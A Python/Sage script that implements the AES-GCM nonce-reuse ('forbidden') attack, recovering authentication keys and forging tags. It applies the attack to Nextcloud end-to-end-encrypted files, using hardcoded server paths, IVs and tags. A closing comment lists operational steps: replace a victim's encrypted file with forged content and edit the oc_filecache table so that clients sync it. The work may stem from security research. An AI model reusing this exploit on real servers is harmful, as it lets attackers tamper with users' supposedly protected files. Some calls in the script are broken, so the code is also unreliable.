#https://github.com/jvdsn/crypto-attacks/blob/master/attacks/gcm/forbidden_attack.py
from sage.all import GF
from sage.all import *
from sage.calculus.predefined import x
from Crypto.Cipher import AES

import argparse
import json
import base64


KEY = base64.b64decode("2hJ+/CBgg+txsGF4bQOY+g==")#b"A"*16
IV = base64.b64decode("oz5fTNCtqp3K6jfU6+xsWw==")

x = GF(2)["x"].gen()
gf2e = GF(2 ** 128, name="y", modulus=x ** 128 + x ** 7 + x ** 2 + x + 1)


# Converts an integer to a gf2e element, little endian.
def _to_gf2e(n):
    return gf2e([(n >> i) & 1 for i in range(127, -1, -1)])


# Converts a gf2e element to an integer, little endian.
def _from_gf2e(p):
    n = p.integer_representation()
    ans = 0
    for i in range(128):
        ans <<= 1
        ans |= ((n >> i) & 1)

    return ans


# Calculates the GHASH polynomial.
def _ghash(h, a, c):
    la = len(a)
    lc = len(c)
    p = gf2e(0)
    for i in range(la // 16):
        p += _to_gf2e(int.from_bytes(a[16 * i:16 * (i + 1)], byteorder="big"))
        p *= h

    if la % 16 != 0:
        p += _to_gf2e(int.from_bytes(a[-(la % 16):] + bytes(16 - la % 16), byteorder="big"))
        p *= h

    for i in range(lc // 16):
        p += _to_gf2e(int.from_bytes(c[16 * i:16 * (i + 1)], byteorder="big"))
        p *= h

    if lc % 16 != 0:
        p += _to_gf2e(int.from_bytes(c[-(lc % 16):] + bytes(16 - lc % 16), byteorder="big"))
        p *= h

    p += _to_gf2e(((8 * la) << 64) | (8 * lc))
    p *= h
    return p


def recover_possible_auth_keys(a1, c1, t1, a2, c2, t2):
    """
    Recovers possible authentication keys from two messages encrypted with the same authentication key.
    More information: Joux A., "Authentication Failures in NIST version of GCM"
    :param a1: the associated data of the first message (bytes)
    :param c1: the ciphertext of the first message (bytes)
    :param t1: the authentication tag of the first message (bytes)
    :param a2: the associated data of the second message (bytes)
    :param c2: the ciphertext of the second message (bytes)
    :param t2: the authentication tag of the second message (bytes)
    :return: a generator generating possible authentication keys (gf2e element)
    """
    h = gf2e["h"].gen()
    p1 = _ghash(h, a1, c1) + _to_gf2e(int.from_bytes(t1, byteorder="big"))
    p2 = _ghash(h, a2, c2) + _to_gf2e(int.from_bytes(t2, byteorder="big"))
    for h, _ in (p1 + p2).roots():
        yield h


def forge_tag(h, a, c, t, target_a, target_c):
    """
    Forges an authentication tag for a target message given a message with a known tag.
    This method is best used with the authentication keys generated by the recover_possible_auth_keys method.
    More information: Joux A., "Authentication Failures in NIST version of GCM"
    :param h: the authentication key to use (gf2e element)
    :param a: the associated data of the message with the known tag (bytes)
    :param c: the ciphertext of the message with the known tag (bytes)
    :param t: the known authentication tag (bytes)
    :param target_a: the target associated data (bytes)
    :param target_c: the target ciphertext (bytes)
    :return: the forged authentication tag (bytes)
    """
    ghash = _from_gf2e(_ghash(h, a, c))
    target_ghash = _from_gf2e(_ghash(h, target_a, target_c))
    return (ghash ^ int.from_bytes(t, byteorder="big") ^ target_ghash).to_bytes(16, byteorder="big")

def aes_gcm_encrypt(plaintext, nonce = b"0"*16):
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return ciphertext, tag


def aes_gcm_decrypt(ciphertext, tag, nonce = b"0"*16):
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=nonce)
    #print(cipher.decrypt(ciphertext))
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext

def forbidden_attack(ctxt1: bytes, ctxt2: bytes, tag1: bytes, tag2: bytes, ptxt1: bytes, target_ptxt, offset = 0):
    if len(ctxt2) < len(ctxt1):
        ctxt0 = ctxt2
        ctxt2 = ctxt1
        ctxt1 = ctxt0
        tag0 = tag2
        tag2 = tag1
        tag1 = tag0
        
    target_ptxt = b"\x00" * offset + target_ptxt
    ptxt1 = b"\x00" * offset + ptxt1
    # ptxt1 xor ctxt1 recovers the keystream, xoring with the target_ptxt 
    # recovers the target_ctxt
    target_ctxt = bytes([x ^ y ^ z  for x, y, z in zip(ctxt1, ptxt1, target_ptxt)])
    for h in recover_possible_auth_keys(b"", ctxt1, tag1, b"",  ctxt2, tag2):
        tag = forge_tag(h, b"", ctxt1,  tag1, b"", target_ctxt)
        print(f"Found tag(b64):\t{base64.b64encode(tag)}")
        print(f"Ctxt:\t{target_ctxt + tag}")
        # return target_ctxt, tag
        try: 
            return target_ctxt, tag
        except :
            print("Wrong MAC")
        print("\n\n")


if __name__ == "__main__":
    iv1 = base64.b64decode("/yT9QEz+7q3qELz+Yn/zYg==")
    iv2 = base64.b64decode("/yT9QEz+7q3qELz+Yn/zYg==")
    tag1 = base64.b64decode("kU5XOZJPDHV4zafMBgbWjg==")
    tag2 = base64.b64decode("RNg0yzeO7jZ6HY+Gw/HRZQ==")
    path1 = "/var/www/nextcloud/data/3/files/tmp/2efbbc8d1e534b6c8f07303a8c66d823.e2e-to-save-11.17-08.30.17.vs"
    path2 = "/var/www/nextcloud/data/3/files/tmp/2efbbc8d1e534b6c8f07303a8c66d823.e2e-to-save-11.17-08.30.42.vs"
    with open(path1, "rb") as f:
        ctxt1 = f.read()[:-16]
    with open(path2, "rb") as f:
        ctxt2 = f.read()[:-16]
    ptxt1 = b'N  is an RSA private key. \nI wish the attack would still be alive, at least I learned a lot with it\n'
    offset = 1
    msg = b"Please forgive me <3"
    target_ptxt = msg + b"\x00" * (len(ptxt1) - len(msg))
    print(aes_gcm_decrypt(ctxt1, tag1, nonce = iv1))
    forbidden_attack(ctxt1, ctxt2, tag1, tag2, ptxt1, target_ptxt, offset, iv=iv1)

    """
    To run tha attack:
    Preconditions: you have recorded two versions of an e2ee file and you know the original(or the new one)

    Steps: 

        1)  python3 attack.py --meta_path appdata_oc4bhkc0r1q1/end_to_end_encryption/meta-data/235/meta.data --cmd dec_sse
            Run this command before and after the update (improvement watch for modification of the folder)
        
        2)  sage -python forbidden_attack.py 09fb8e0fa0cc48819f90058406919ec1 'I love piiza\n' 'I love crime\n'
            this will recover the ctxt decrypting to 'I love crime' and compute the corresponding tag
        
        3)  update the e2ee file and folder metadata with the ctxt and tag computed in 2 
        
        4)  UPDATE oc_filecache SET etag = 'ff464cb7335e56a1aae87a91da90' where fileid = 4001
            UPDATE oc_filecache SET encrypted = 0 where fileid = 4001
            This is need to avoid SSE and ensuring that the sync from the client will pull the update

        5) From the client modify a file to trigger sync (TODO: find a way to trigger sync from server)
     
    """